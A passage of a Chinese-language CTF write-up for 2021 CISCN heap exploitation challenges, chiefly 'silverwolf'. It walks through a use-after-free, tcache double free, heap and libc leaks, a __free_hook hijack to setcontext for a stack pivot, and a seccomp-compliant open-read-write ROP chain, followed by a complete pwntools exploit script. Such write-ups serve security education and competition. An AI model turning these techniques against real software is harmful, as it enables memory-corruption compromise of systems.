class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Index: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x70</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Content: &#x27;</span>)</span><br><span class="line">heap_base = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x260</span></span><br><span class="line">log.success(<span class="string">&quot;[*]heap_base =&gt; &quot;</span> + <span class="built_in">hex</span>(heap_base))</span><br><span class="line">payload = p64(heap_base + <span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x70</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x70</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x23</span>+<span class="string">&#x27;\x07&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Content: &#x27;</span>)</span><br><span class="line">libc_base = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">96</span> -<span class="number">0x10</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;[*]libc_base =&gt; &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">one_gadget = libc_base + <span class="number">0x10a41c</span></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;\x03&#x27;</span>+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x3f</span>+p64(free_hook))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(one_gadget))</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x4f3d5</span></span><br><span class="line"><span class="string">0x4f432</span></span><br><span class="line"><span class="string">0x10a41c</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="silverwolf"><a href="#silverwolf" class="headerlink" title="silverwolf"></a>silverwolf</h3><img src="/2021/10/22/2021%C2%B7CISCN%E5%9B%BD%E8%B5%9B%E5%88%9D%E8%B5%9BWP/2.png" class=""><p>保护全开</p><p>在初始化的时候是开了沙箱的</p><img src="/2021/10/22/2021%C2%B7CISCN%E5%9B%BD%E8%B5%9B%E5%88%9D%E8%B5%9BWP/1.png" class=""><p>拿工具扫一下，只能用ORW三个系统调用，ORW没跑了</p><img src="/2021/10/22/2021%C2%B7CISCN%E5%9B%BD%E8%B5%9B%E5%88%9D%E8%B5%9BWP/3.png" class=""><p>和上题相比就是多了一个沙箱，这里只列出<code>alloc</code>，<code>free</code>函数</p><p>alloc：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">alloc</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> size_1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">void</span> *ptr; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">size_t</span> size; <span class="comment">// [rsp+0h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+8h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="number">1LL</span>, <span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(&amp;unk_1144, &amp;size);</span><br><span class="line">  <span class="keyword">if</span> ( !size )<span class="comment">//index还是得等于0</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="number">1LL</span>, <span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(&amp;unk_1144, &amp;size);</span><br><span class="line">    size_1 = size;</span><br><span class="line">    <span class="keyword">if</span> ( size &gt; <span class="number">0x78</span> )<span class="comment">//只能申请小于0x78大小的堆块</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="number">1LL</span>, <span class="string">&quot;Too large&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      ptr = <span class="built_in">malloc</span>(size);</span><br><span class="line">      <span class="keyword">if</span> ( ptr )</span><br><span class="line">      &#123;</span><br><span class="line">        chunk_size = size_1;</span><br><span class="line">        chunk_ptr = ptr;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;allocate failed&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>free：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+0h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="number">1LL</span>, <span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(&amp;unk_1144, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( !v1 &amp;&amp; chunk_ptr )</span><br><span class="line">    <span class="built_in">free</span>(chunk_ptr);<span class="comment">//uaf</span></span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>既然是堆的ORW那么就需要泄露<code>heap_base</code>和<code>libc_base</code>，泄露<code>heap_base</code>的目的是栈迁移到堆上，并且在堆上布置ROP链，<code>libc_base</code>是为了寻找对应的<code>ROPgadget</code></p><p>因为堆块的结构都是一样的，泄露<code>heap_base</code>和<code>libc_base</code>步骤都差不多，不过还是有点差别，原因在于初始化的时候，申请了很多堆块也free了很多堆块，所以在这就要先把堆块全部申请回来然后再进行<code>double free</code>，当时没有申请回来，也能够正常泄露<code>heap_base</code>和<code>libc_base</code>，但是在后面写的时候写不进去，所以还是搭建和之前那题一样的环境吧！</p><p>和上题一样修改<code>tache bin</code> 的key就能进行<code>double free</code>了，之后直接show就能泄露<code>heap_base</code>了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x78</span>)</span><br><span class="line">    edit(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    edit(<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    free()</span><br></pre></td></tr></table></figure><p>之后就是修改<code>tache bin</code>的fd劫持到控制堆块，泄露<code>libc_base</code>，没啥变化</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">edit(p64(heap_base+<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">edit(<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x23</span> + <span class="string">&#x27;\x07&#x27;</span>)</span><br><span class="line">free()</span><br></pre></td></tr></table></figure><p>泄露工作完成之后，就能去找<code>ROPgadget</code>了，记得一定要看清楚….其中一个<code>gadget</code>不知道怎么就找错了，卡了一段时间….</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">pop_rdi = libc_base + <span class="number">0x215bf</span></span><br><span class="line">pop_rax = libc_base + <span class="number">0x43ae8</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x23eea</span></span><br><span class="line">pop_rdx = libc_base + <span class="number">0x1b96</span></span><br><span class="line">read = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write = libc_base + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">setcontext = libc_base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">53</span></span><br><span class="line">syscall = libc_base + <span class="number">0xE5965</span></span><br><span class="line">flag_addr = heap_base + <span class="number">0x1000</span></span><br><span class="line">ret = libc_base + <span class="number">0x8aa</span></span><br></pre></td></tr></table></figure><p>之前劫持了控制堆块，这里就开始写它布置我们需要的堆块，<code>heap_base + 0x1000</code>用来放置flag的路径，<code>heap_base + 0x2000</code>和<code>heap_base + 0x20A0</code>是用来栈迁移的，至于为什么是这两个地址，等下就知道了，<code>heap_base + 0x3000</code>和<code>heap_base + 0x3060</code>是用来存我们的ROP链的，因为一个堆块放不下，只能用两个堆块来放</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;\x02&#x27;</span>*<span class="number">0x40</span></span><br><span class="line">payload += p64(free_hook)<span class="comment">#0x20</span></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x1000</span>)<span class="comment">#flag #0x30</span></span><br><span class="line">payload += p64(heap_base + <span class="number">0x2000</span>)<span class="comment">#stack #0x40</span></span><br><span class="line">payload += p64(heap_base + <span class="number">0x20A0</span>)<span class="comment">#stack 0x60</span></span><br><span class="line">payload += p64(heap_base + <span class="number">0x3000</span>)<span class="comment">#orw1 #0x50</span></span><br><span class="line">payload += p64(heap_base + <span class="number">0x3060</span>)<span class="comment">#orw2 #0x60</span></span><br><span class="line"><span class="comment"># pasue()</span></span><br><span class="line">edit(payload)</span><br></pre></td></tr></table></figure><p>ROP链和以前的没什么区别，就是注意一下打开和读的位置，至于为什么第一个为什么用的是系统调用，因为read会破坏我们的堆栈结构，所以就用系统调用就好了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">orw = p64(pop_rdi) + p64(flag_addr)</span><br><span class="line">orw += p64(pop_rax) + p64(<span class="number">2</span>)</span><br><span class="line">orw += p64(pop_rsi) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(syscall)</span><br><span class="line">orw += p64(pop_rdi) + p64(<span class="number">3</span>)</span><br><span class="line">orw += p64(pop_rsi) + p64(heap_base  + <span class="number">0x3000</span>)</span><br><span class="line">orw += p64(pop_rdx) + p64(<span class="number">0x30</span>)</span><br><span class="line">orw += p64(read)</span><br><span class="line">orw += p64(pop_rdi) + p64(<span class="number">1</span>)</span><br><span class="line">orw += p64(write)</span><br></pre></td></tr></table></figure><img src="/2021/10/22/2021%C2%B7CISCN%E5%9B%BD%E8%B5%9B%E5%88%9D%E8%B5%9BWP/4.jpg" class="" width="4"><p>下面就是进行参数布置和栈迁移了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">edit(p64(setcontext))<span class="comment">#修改__free_hook为setcontext+53</span></span><br><span class="line">add(<span class="number">0x38</span>)</span><br><span class="line">edit(<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">edit(orw[:<span class="number">0x60</span>])</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">edit(orw[<span class="number">0x60</span>:])</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x58</span>)</span><br><span class="line">edit(p64(heap_base + <span class="number">0x3000</span>)+p64(ret))</span><br><span class="line">add(<span class="number">0x48</span>)</span><br><span class="line">free()</span><br></pre></td></tr></table></figure><p>首先<code>setcontext+53</code>是怎么回事呢？在libc中搜索，就能看到这条gadget，发现只要控制了rdi就能够控制rsp，所以怎么控制rdi呢？这就很巧妙，我们来看下free( )函数，它原本的参数rdi就是堆块的地址对不对，所以当我们劫持它变成<code>setcontext+53</code>的时候，这个rdi就传给了它，所以它就会去[rdi+0A0]的内存处去找，这个位置正正好好就是<code>add(0x58)</code>这个堆块的位置，所以rsp就变成<code>heap_base + 0x3000</code>这个地方，而这个地方存放着我们的ROP链，就一环扣一环，很巧妙…，至于为什么要加一个ret，看图中是不是push了rcx，防止它破坏栈结构把它弹出来</p><img src="/2021/10/22/2021%C2%B7CISCN%E5%9B%BD%E8%B5%9B%E5%88%9D%E8%B5%9BWP/5.jpg" class=""><p>接下来调试看看</p><p>此时的<code>free</code>已经被劫持进了<code>setcontext+53</code></p><img src="/2021/10/22/2021%C2%B7CISCN%E5%9B%BD%E8%B5%9B%E5%88%9D%E8%B5%9BWP/6.png" class=""><p>0x56222468d000就是**add(0x48)<strong>之后的地址，它加A0的位置就是</strong>p64(heap_base + 0x3000)+p64(ret)**的位置</p><img src="/2021/10/22/2021%C2%B7CISCN%E5%9B%BD%E8%B5%9B%E5%88%9D%E8%B5%9BWP/7.png" class=""><p>此时的rsp已经到了我们的ROP链，可以看到第一条命令是POP rdi，没毛病！</p><img src="/2021/10/22/2021%C2%B7CISCN%E5%9B%BD%E8%B5%9B%E5%88%9D%E8%B5%9BWP/8.jpg" class=""><p>完成ROP链的调用之后，就得到了<code>flag</code></p><img src="/2021/10/22/2021%C2%B7CISCN%E5%9B%BD%E8%B5%9B%E5%88%9D%E8%B5%9BWP/9.png" class=""><p>完整exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;silverwolf&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">binary = <span class="string">&#x27;silverwolf&#x27;</span></span><br><span class="line">port = <span class="string">&#x27;26743&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    io = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;: &#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;: &#x27;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">content</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;: &#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;: &#x27;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;: &#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;: &#x27;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>():</span></span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;: &#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;: &#x27;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">gdb.attach(io)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x78</span>)</span><br><span class="line">    edit(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    edit(<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    free()</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Content: &#x27;</span>)</span><br><span class="line">heap_base = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) &amp; <span class="number">0xfffffffff000</span></span><br><span class="line">success(<span class="string">&#x27;heap_base -&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(heap_base)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(p64(heap_base+<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">edit(<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x23</span> + <span class="string">&#x27;\x07&#x27;</span>)</span><br><span class="line">free()</span><br><span class="line">show()</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Content: &#x27;</span>)</span><br><span class="line">libc_base = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x70</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;libc_base -&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">pop_rdi = libc_base + <span class="number">0x215bf</span></span><br><span class="line">pop_rax = libc_base + <span class="number">0x43ae8</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x23eea</span></span><br><span class="line">pop_rdx = libc_base + <span class="number">0x1b96</span></span><br><span class="line">read = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write = libc_base + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">setcontext = libc_base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">53</span></span><br><span class="line">syscall = libc_base + <span class="number">0xE5965</span></span><br><span class="line">flag_addr = heap_base + <span class="number">0x1000</span></span><br><span class="line">ret = libc_base + <span class="number">0x8aa</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#add(0,0x240)</span></span><br><span class="line">payload = <span class="string">&#x27;\x02&#x27;</span>*<span class="number">0x40</span></span><br><span class="line">payload += p64(free_hook)<span class="comment">#0x20</span></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x1000</span>)<span class="comment">#flag #0x30</span></span><br><span class="line">payload += p64(heap_base + <span class="number">0x2000</span>)<span class="comment">#stack #0x40</span></span><br><span class="line">payload += p64(heap_base + <span class="number">0x20A0</span>)<span class="comment">#stack 0x60</span></span><br><span class="line">payload += p64(heap_base + <span class="number">0x3000</span>)<span class="comment">#orw1 #0x50</span></span><br><span class="line">payload += p64(heap_base + <span class="number">0x3060</span>)<span class="comment">#orw2 #0x60</span></span><br><span class="line"><span class="comment"># pasue()</span></span><br><span class="line">edit(payload)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">orw = p64(pop_rdi) + p64(flag_addr)</span><br><span class="line">orw += p64(pop_rax) + p64(<span class="number">2</span>)</span><br><span class="line">orw += p64(pop_rsi) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(syscall)</span><br><span class="line">orw += p64(pop_rdi) + p64(<span class="number">3</span>)</span><br><span class="line">orw += p64(pop_rsi) + p64(heap_base  + <span class="number">0x3000</span>)</span><br><span class="line">orw += p64(pop_rdx) + p64(<span class="number">0x20</span>)</span><br><span class="line">orw += p64(read)</span><br><span class="line">orw += p64(pop_rdi) + p64(<span class="number">1</span>)</span><br><span class="line">orw += p64(write)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">edit(p64(setcontext))</span><br><span class="line">add(<span class="number">0x38</span>)</span><br><span class="line">edit(<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">edit(orw[:<span class="number">0x60</span>])</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">edit(orw[<span class="number">0x60</span>:])</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x58</span>)</span><br><span class="line">edit(p64(heap_base + <span class="number">0x3000</span>)+p64(ret))</span><br><span class="line">add(<span class="number">0x48</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">free()</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="pwny"><a href="#pwny" class="headerlink" title="pwny"></a>pwny</h3><p>在初始化函数中<code>open</code>了一个文件，并将把<code>fd</code>存起来</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_A10</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  result = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( result &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  fd = result;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>write</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 